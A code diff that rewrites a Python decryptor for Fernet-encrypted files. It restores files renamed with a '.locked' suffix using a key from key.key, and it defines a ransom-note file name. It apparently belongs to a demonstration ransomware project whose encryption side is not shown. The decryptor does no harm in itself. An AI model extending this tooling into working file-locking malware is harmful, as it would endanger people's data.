@@ -1,28 +1,70 @@
 import os
+from pathlib import Path
 
 from cryptography.fernet import Fernet, InvalidToken
 
-from encrypt import read_key
+KEY_FILE = Path("key.key")
+TARGET_DIR = Path("files")
+LOCKED_SUFFIX = ".locked"
+NOTE_NAME = "HOW_TO_RECOVER_FILES.txt"
 
 
-def decrypt(targets, key):
-    fernet_key = Fernet(key)
-    for target in targets:
-        with open(target, "rb") as f:
-            file_content = f.read()
+def load_key(path: Path = KEY_FILE) -> bytes:
+    return path.read_bytes()
 
+
+def iter_locked(root: Path):
+    for entry in root.rglob(f"*{LOCKED_SUFFIX}"):
+        if entry.is_file():
+            yield entry
+
+
+def decrypt_file(fernet: Fernet, path: Path) -> bool:
+    data = path.read_bytes()
+
+    try:
+        plaintext = fernet.decrypt(data)
+    except InvalidToken:
+        print(f"[SKIP] {path.name} : clé invalide ou fichier non chiffré")
+        return False
+
+    tmp = path.with_suffix(path.suffix + ".tmp")
+    tmp.write_bytes(plaintext)
+    original = path.with_suffix("")  # retire .locked
+    os.replace(tmp, original)
+    path.unlink(missing_ok=True)
+
+    print(f"[OK]   {original.name}")
+    return True
+
+
+def decrypt_all(root: Path, key: bytes) -> tuple[int, int]:
+    fernet = Fernet(key)
+    ok = 0
+    ko = 0
+    for path in iter_locked(root):
         try:
-            decrypted_content = fernet_key.decrypt(file_content)
-            with open(target, "wb") as f:
-                f.write(decrypted_content)
-            print(f"{target} has been decrypted.")
-        except (InvalidToken, Exception):
-            print(f"{target} is not encrypted or the key is invalid. Skipped.")
+            if decrypt_file(fernet, path):
+                ok += 1
+            else:
+                ko += 1
+        except OSError as exc:
+            print(f"[ERR]  {path.name} : {exc}")
+            ko += 1
+    return ok, ko
 
 
-if __name__ == '__main__':
-    key = read_key()
-    target_folder_path = "files/"
-    targets = [target_folder_path + filename for filename in os.listdir(target_folder_path) if filename != "readme.txt"]
+def main() -> None:
+    if not KEY_FILE.exists():
+        raise SystemExit(f"Clé introuvable : {KEY_FILE}")
 
-    decrypt(targets, key)
+    if not TARGET_DIR.is_dir():
+        raise SystemExit(f"Dossier cible introuvable : {TARGET_DIR}")
+
+    key = load_key()
+    ok, ko = decrypt_all(TARGET_DIR, key)
+    print(f"\nTerminé : {ok} déchiffrés, {ko} échecs")
+
+
+if __name__ == "__main__":
+    main()
